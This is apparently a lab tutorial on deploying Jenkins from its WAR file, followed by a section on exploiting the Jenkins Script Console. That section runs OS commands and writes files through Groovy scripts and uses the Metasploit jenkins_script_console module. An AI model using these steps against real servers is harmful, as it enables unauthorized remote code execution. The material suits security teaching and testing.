# Jenkins: Deployment and Security Considerations

## Authors

## Introduction
Jenkins is a self-contained, open-source automation server that can be used to automate various tasks such as building, testing, and deploying software. It can be installed through native system packages, Docker, or run standalone on any machine with the Java Runtime Environment (JRE) installed.

## How to Deploy Jenkins

### Prerequisites
- **Java**: Jenkins requires at least Java 7, but Java 8 is recommended.
- **RAM**: A system with more than 512MB of RAM is recommended.

### Steps to Deploy Jenkins

1. **Download Jenkins**:
   - Download the Jenkins WAR file from the official mirror: [http://mirrors.jenkins.io/war-stable/latest/jenkins.war](http://mirrors.jenkins.io/war-stable/latest/jenkins.war).

2. **Run Jenkins**:
   - Open a terminal in the directory where you downloaded the Jenkins WAR file and execute the following command:
     ```sh
     java -jar jenkins.war
     ```

3. **Access Jenkins**:
   - Open a web browser and navigate to `http://localhost:8080` to complete the installation process.

4. **Docker Integration**:
   - Many Pipeline examples require Docker to be installed on the same machine as Jenkins.

### Example Installation Log
```sh
root@lab:~/Downloads# java -jar jenkins.war
Running from: /root/Downloads/jenkins.war
webroot: $user.home/.jenkins
Mar 15, 2017 5:03:49 AM Main deleteWinstoneTempContents
WARNING: Failed to delete the temporary Winstone file /tmp/winstone/jenkins.war

INFO:
*************************************************************
Jenkins initial setup is required. An admin user has been created and a password generated.
Please use the following password to proceed to installation:
e019dca34bac4a30beca67b53e821f35
This may also be found at: /root/.jenkins/secrets/initialAdminPassword
*************************************************************

Mar 15, 2017 5:05:10 AM hudson.WebAppMain$3 run
INFO: Jenkins is fully up and running
```

### Important Note
- During the setup, an admin user and a password are generated. You will need this password to complete the installation. The password can be found in the log output or at `/root/.jenkins/secrets/initialAdminPassword`.

## How to Exploit a Jenkins Server

### Accessing the Script Console
- Navigate to `http://127.0.0.1:8080/script` to access the Jenkins Script Console.
- The Script Console allows you to execute arbitrary Groovy scripts on the server, which can be useful for troubleshooting and diagnostics.

### Example Scripts

#### Executing OS Commands
- **execmd.groovy**:
  - This script can help you execute operating system commands on the Jenkins server.
  ```groovy
  // Windows
  println "cmd.exe /c dir".execute().text
  // Linux
  println "uname -a".execute().text
  ```

#### Writing to Files
- **writefile.groovy**:
  - This script can write strings into a file on the Jenkins server.
  ```groovy
  new File("/tmp/test.sh").write("""
  echo "123"
  echo "456"
  """)
  ```

### Using Metasploit Framework
- If you prefer using the Metasploit Framework, you can exploit the Jenkins Script Console with the following steps:
  ```sh
  msf > use exploit/multi/http/jenkins_script_console
  msf exploit(jenkins_script_console) > show options
  Module options (exploit/multi/http/jenkins_script_console):
     Name       Current Setting  Required  Description
     ----       ---------------  --------  -----------
     PASSWORD   password         no        The password for the specified username
     Proxies                     no        A proxy chain of format type:host:port[,type:host:port][...]
     RHOST      192.168.1.100    yes       The target address
     RPORT      8080             yes       The target port
     TARGETURI  /                yes       The path to jenkins
     USERNAME   test             no        The username to authenticate as
     VHOST                       no        HTTP server virtual host
  Exploit target:
     Id  Name
     --  ----
     1   Linux
  msf exploit(jenkins_script_console) > exploit
  ```
